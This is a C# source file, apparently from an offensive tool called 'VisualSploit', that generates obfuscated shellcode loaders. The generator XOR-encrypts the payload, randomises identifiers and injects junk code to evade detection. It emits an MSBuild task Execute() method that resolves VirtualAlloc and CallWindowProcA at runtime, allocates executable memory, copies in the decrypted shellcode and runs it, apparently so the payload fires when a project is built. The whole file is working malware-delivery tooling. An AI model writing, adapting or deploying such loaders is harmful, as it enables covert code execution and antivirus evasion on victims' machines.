namespace VisualSploit;

internal static class Loader
{
    public static string Generate(byte[] shellcode, Config cfg, Naming naming)
    {
        var virtualAllocDel = naming.Next();
        var callWindowProcDel = naming.Next();
        var loadLib = naming.Next();
        var getProc = naming.Next();

        var bufVar = naming.Next();
        var kernel32Name = naming.Next();
        var user32Name = naming.Next();
        var kernel32Handle = naming.Next();
        var user32Handle = naming.Next();
        var virtualAllocName = naming.Next();
        var callWindowProcName = naming.Next();
        var virtualAllocPtr = naming.Next();
        var callWindowProcPtr = naming.Next();
        var length = naming.Next();
        var handle = naming.Next();

        var (data, keys) = Xor.Encrypt(shellcode, cfg.XorRounds, cfg.Seed.HasValue ? naming.Rng : null);
        var decrypt = Xor.Routine(bufVar, data, keys);

        return $$"""
                      delegate System.IntPtr {{virtualAllocDel}}(System.IntPtr a, uint s, uint t, uint p);
                      delegate System.IntPtr {{callWindowProcDel}}(System.IntPtr f, System.IntPtr h, uint m, System.IntPtr w, System.IntPtr l);

                      [System.Runtime.InteropServices.DllImport("kernel32")]
                      static extern System.IntPtr {{loadLib}}(string n);
                      [System.Runtime.InteropServices.DllImport("kernel32")]
                      static extern System.IntPtr {{getProc}}(System.IntPtr m, string p);

                      public override bool Execute()
                      {
                          {{Junk.Emit(cfg, naming)}}var {{kernel32Name}} = "kernel32";
                          var {{user32Name}} = "user32";
                          var {{kernel32Handle}} = {{loadLib}}({{kernel32Name}});
                          var {{user32Handle}} = {{loadLib}}({{user32Name}});

                          var {{virtualAllocName}} = "VirtualAlloc";
                          var {{callWindowProcName}} = "CallWindowProcA";

                          var {{virtualAllocPtr}} = ({{virtualAllocDel}})System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer({{getProc}}({{kernel32Handle}}, {{virtualAllocName}}), typeof({{virtualAllocDel}}));
                          var {{callWindowProcPtr}} = ({{callWindowProcDel}})System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer({{getProc}}({{user32Handle}}, {{callWindowProcName}}), typeof({{callWindowProcDel}}));

                          {{Junk.Emit(cfg, naming)}}{{decrypt}}
                          var {{length}} = ((uint){{bufVar}}.Length + 0xFFFu) & ~0xFFFu;
                          var {{handle}} = {{virtualAllocPtr}}(System.IntPtr.Zero, {{length}}, 1u << 12, 0x40u);
                          System.Runtime.InteropServices.Marshal.Copy({{bufVar}}, 0, {{handle}}, {{bufVar}}.Length);

                          {{callWindowProcPtr}}({{handle}}, System.IntPtr.Zero, 0, System.IntPtr.Zero, System.IntPtr.Zero);
                          return true;
                      }
                      """;
    }
}
